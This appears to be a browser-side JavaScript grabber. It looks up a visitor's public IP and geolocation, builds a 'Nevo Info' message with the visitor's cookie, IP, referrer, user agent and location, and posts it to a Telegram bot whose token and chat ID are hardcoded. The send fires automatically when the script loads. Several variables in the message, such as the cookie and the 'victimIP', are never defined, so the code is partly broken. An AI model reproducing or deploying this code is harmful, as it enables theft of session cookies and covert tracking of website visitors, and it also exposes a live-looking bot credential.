function getClientIP() {
    return fetch('https://api64.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(error => 'UNKNOWN');
}

function getGeoInfo(ip) {
    return fetch(`https://ipinfo.io/${ip}/json`)
        .then(response => response.json())
        .catch(error => null);
}

function sendMessageToTelegram(msg) {
    const botToken = '6122428056:AAGnIMsjHzFpM9taaSTzdvFsJGNaTmvjZCY';
    const chatId = '-1001874783762';
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = new URLSearchParams({
        chat_id: chatId,
        text: msg
    });

    return fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: data
    })
    .then(response => response.json())
    .catch(error => null);
}

async function fetchDataAndSendTelegramMessage() {
    try {
        const clientIP = await getClientIP();
        const geoInfo = await getGeoInfo(clientIP);

        let countryFlag = '';
        if (geoInfo && geoInfo.country) {
            const flags = {
                'AF' : '🇦🇫','AX' : '🇦🇽','AL' : '🇦🇱','DZ' : '🇩🇿','AS' : '🇦🇸','AD' : '🇦🇩','AO' : '🇦🇴','AI' : '🇦🇮','AQ' : '🇦🇶','AG' : '🇦🇬','AR' : '🇦🇷','AM' : '🇦🇲','AW' : '🇦🇼','AU' : '🇦🇺','AT' : '🇦🇹','AZ' : '🇦🇿','BS' : '🇧🇸','BH' : '🇧🇭','BD' : '🇧🇩','BB' : '🇧🇧','BY' : '🇧🇾','BE' : '🇧🇪','BZ' : '🇧🇿','BJ' : '🇧🇯','BM' : '🇧🇲','BT' : '🇧🇹','BO' : '🇧🇴','BA' : '🇧🇦','BW' : '🇧🇼','BV' : '🇧🇻','BR' : '🇧🇷','IO' : '🇮🇴','BN' : '🇧🇳','BG' : '🇧🇬','BF' : '🇧🇫','BI' : '🇧🇮','KH' : '🇰🇭','CM' : '🇨🇲','CA' : '🇨🇦','CV' : '🇨🇻','KY' : '🇰🇾','CF' : '🇨🇫','TD' : '🇹🇩','CL' : '🇨🇱','CN' : '🇨🇳','CX' : '🇨🇽','CC' : '🇨🇨','CO' : '🇨🇴','KM' : '🇰🇲','CG' : '🇨🇬','CD' : '🇨🇩','CK' : '🇨🇰','CR' : '🇨🇷','CI' : '🇨🇮','HR' : '🇭🇷','CU' : '🇨🇺','CY' : '🇨🇾','CZ' : '🇨🇿','DK' : '🇩🇰','DJ' : '🇩🇯','DM' : '🇩🇲','DO' : '🇩🇴','EC' : '🇪🇨','EG' : '🇪🇬','SV' : '🇸🇻','GQ' : '🇬🇶','ER' : '🇪🇷','EE' : '🇪🇪','ET' : '🇪🇹','FK' : '🇫🇰','FO' : '🇫🇴','FJ' : '🇫🇯','FI' : '🇫🇮','FR' : '🇫🇷','GF' : '🇬🇫','PF' : '🇵🇫','TF' : '🇹🇫','GA' : '🇬🇦','GM' : '🇬🇲','GE' : '🇬🇪','DE' : '🇩🇪','GH' : '🇬🇭','GI' : '🇬🇮','GR' : '🇬🇷','GL' : '🇬🇱','GD' : '🇬🇩','GP' : '🇬🇵','GU' : '🇬🇺','GT' : '🇬🇹','GG' : '🇬🇬','GN' : '🇬🇳','GW' : '🇬🇼','GY' : '🇬🇾','HT' : '🇭🇹','HM' : '🇭🇲','VA' : '🇻🇦','HN' : '🇭🇳','HK' : '🇭🇰','HU' : '🇭🇺','IS' : '🇮🇸','IN' : '🇮🇳','ID' : '🇮🇩','IR' : '🇮🇷','IQ' : '🇮🇶','IE' : '🇮🇪','IM' : '🇮🇲','IL' : '🇮🇱','IT' : '🇮🇹','JM' : '🇯🇲','JP' : '🇯🇵','JE' : '🇯🇪','JO' : '🇯🇴','KZ' : '🇰🇿','KE' : '🇰🇪','KI' : '🇰🇮','KP' : '🇰🇵','KR' : '🇰🇷','KW' : '🇰🇼','KG' : '🇰🇬','LA' : '🇱🇦','LV' : '🇱🇻','LB' : '🇱🇧','LS' : '🇱🇸','LR' : '🇱🇷','LY' : '🇱🇾','LI' : '🇱🇮','LT' : '🇱🇹','LU' : '🇱🇺','MO' : '🇲🇴','MK' : '🇲🇰','MG' : '🇲🇬','MW' : '🇲🇼','MY' : '🇲🇾','MV' : '🇲🇻','ML' : '🇲🇱','MT' : '🇲🇹','MH' : '🇲🇭','MQ' : '🇲🇶','MR' : '🇲🇷','MU' : '🇲🇺','YT' : '🇾🇹','MX' : '🇲🇽','FM' : '🇫🇲','MD' : '🇲🇩','MC' : '🇲🇨','MN' : '🇲🇳','ME' : '🇲🇪','MS' : '🇲🇸','MA' : '🇲🇦','MZ' : '🇲🇿','MM' : '🇲🇲','NA' : '🇳🇦','NR' : '🇳🇷','NP' : '🇳🇵','NL' : '🇳🇱','AN' : '🇦🇳','NC' : '🇳🇨','NZ' : '🇳🇿','NI' : '🇳🇮','NE' : '🇳🇪','NG' : '🇳🇬','NU' : '🇳🇺','NF' : '🇳🇫','MP' : '🇲🇵','NO' : '🇳🇴','OM' : '🇴🇲','PK' : '🇵🇰','PW' : '🇵🇼','PS' : '🇵🇸','PA' : '🇵🇦','PG' : '🇵🇬','PY' : '🇵🇾','PE' : '🇵🇪','PH' : '🇵🇭','PN' : '🇵🇳','PL' : '🇵🇱','PT' : '🇵🇹','PR' : '🇵🇷','QA' : '🇶🇦','RE' : '🇷🇪','RO' : '🇷🇴','RU' : '🇷🇺','RW' : '🇷🇼','BL' : '🇧🇱','SH' : '🇸🇭','KN' : '🇰🇳','LC' : '🇱🇨','MF' : '🇲🇫','PM' : '🇵🇲','VC' : '🇻🇨','WS' : '🇼🇸','SM' : '🇸🇲','ST' : '🇸🇹','SA' : '🇸🇦','SN' : '🇸🇳','RS' : '🇷🇸','SC' : '🇸🇨','SL' : '🇸🇱','SG' : '🇸🇬','SK' : '🇸🇰','SI' : '🇸🇮','SB' : '🇸🇧','SO' : '🇸🇴','ZA' : '🇿🇦','GS' : '🇬🇸','SS' : '🇸🇸','ES' : '🇪🇸','LK' : '🇱🇰','SD' : '🇸🇩','SR' : '🇸🇷','SJ' : '🇸🇯','SZ' : '🇸🇿','SE' : '🇸🇪','CH' : '🇨🇭','SY' : '🇸🇾','TW' : '🇹🇼','TJ' : '🇹🇯','TZ' : '🇹🇿','TH' : '🇹🇭','TL' : '🇹🇱','TG' : '🇹🇬','TK' : '🇹🇰','TO' : '🇹🇴','TT' : '🇹🇹','TN' : '🇹🇳','TR' : '🇹🇷','TM' : '🇹🇲','TC' : '🇹🇨','TV' : '🇹🇻','UG' : '🇺🇬','UA' : '🇺🇦','AE' : '🇦🇪','GB' : '🇬🇧','US' : '🇺🇸','UM' : '🇺🇲','UY' : '🇺🇾','UZ' : '🇺🇿','VU' : '🇻🇺','VE' : '🇻🇪','VN' : '🇻🇳','VG' : '🇻🇬','VI' : '🇻🇮','WF' : '🇼🇫','EH' : '🇪🇭','YE' : '🇾🇪','ZM' : '🇿🇲','ZW' : '🇿🇼',
            };
            countryFlag = flags[geoInfo.country] || '';
        }

        const message = `-----{===--{ Nevo Info }--===}-----

Cookie IS: ${cookie}

IP Address: ${victimIP}

User Comes From: ${Ref}

Server Name IS: ${serverName}

Server IP Address IS: ${serverAddr}

User Info: ${userAgent}

Public IP: ${PublicIP}${countryFlag}

User Country IS: ${country}

User Region IS: ${region}

User City IS: ${city}

User Location Map IS: ${loc}

User ZIP IS: ${postal}

User TimeZone IS: ${timezone}

User hostname IP IS: ${hostname}${org}

-----{===--{ Nevo Info }--===}-----`;

        const response = await sendMessageToTelegram(message);
        console.log('Message sent to Telegram:', response);
    } catch (error) {
        console.error('Error:', error);
    }
}

// Call the function to fetch data and send the message
fetchDataAndSendTelegramMessage();
